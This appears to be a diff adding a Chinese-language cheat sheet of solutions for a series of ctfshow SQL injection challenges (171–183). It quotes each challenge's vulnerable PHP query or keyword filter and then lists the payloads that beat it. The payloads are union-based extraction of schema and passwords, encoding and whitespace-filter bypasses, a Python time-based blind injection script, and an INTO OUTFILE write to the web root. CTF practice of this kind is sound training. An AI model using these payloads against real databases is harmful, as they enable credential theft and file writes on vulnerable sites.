@@ -1,0 +1,115 @@
+https://y4tacker.blog.csdn.net/?type=blog  大神博客
+
+171：
+$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
+拼接字符串：
+-1' or id ='26;#
+-1' or id ='26
+union查询：
+# @Author:Y4tacker
+# 查数据库
+payload = "-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+"
+# 查列名
+payload="-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user' --+"
+# 查flag
+payload="-1'union select id,username,password from ctfshow_user --+"
+
+
+172：
+$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
+//检查结果是否有flag
+    if($row->username!=='flag'){
+      $ret['msg']='查询成功';
+    }
+编码绕过：
+-1' union select to_base64(username),hex(password) from ctfshow_user2 --+
+-1' union select 1,(select group_concat(password) from ctfshow_user3),3 --+
+
+173：
+$sql = "select id,username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
+  if(!preg_match('/flag/i', json_encode($ret))){
+      $ret['msg']='查询成功';
+    }
+-1' union select 1,(select group_concat(password) from ctfshow_user3),3 --+
+-1' union select 1,to_base64(username),hex(password) from ctfshow_user2 --+
+1' union select id,hex(username),hex(password) from ctfshow_user3--+
+
+174:
+$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
+  //检查结果是否有flag
+  if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
+      $ret['msg']='查询成功';
+    }
+1' and sleep(3)--+
+
+175：
+#盲注
+import requests
+url = "http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1' and "
+result = ''
+i = 0
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head < tail:
+        mid = (head + tail) >> 1
+        payload = f'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))>{mid},sleep(2),0) -- -'
+        try:
+            r = requests.get(url + payload, timeout=0.5)
+            tail = mid
+        except Exception as e:
+            head = mid + 1
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+写文件
+1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'--+
+
+176：
+万能密码呗，噗嗤
+1' or 1=1--+然后最后一行发现了flag
+大小写
+1' uNion sElect 1,2,password from ctfshow_user --+
+
+177
+过滤空格，用/**/
+-1'union/**/select/**/1,password,3/**/from/**/ctfshow_user/**/where/**/username='flag';%23
+
+178
+过滤了空格与*号等用%09绕过
+-1'union%09select%091,password,3%09from%09ctfshow_user%09where%09username='flag';%23
+-1'union%09select%091,password,3%09from%09ctfshow_user%09where%09username='flag'%23
+一句话
+id=1'or'1'='1'%23
+
+179
+1'or'1'='1'%23
+%0c 可代替空格
+1'union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23
+
+180
+-1'or(id=26)and'1'='1
+
+181
+过滤
+ function waf($str){
+    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
+  }
+-1'or(id=26)and'1'='1
+-1'%0cor%0cusername='flag
+
+182
+ function waf($str){
+    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
+  }
+运用like
+-1'%0cor%0cusername%0clike'%fl%
+
+183
+//拼接sql语句查找指定ID用户
+  $sql = "select count(pass) from ".$_POST['tableName'].";";
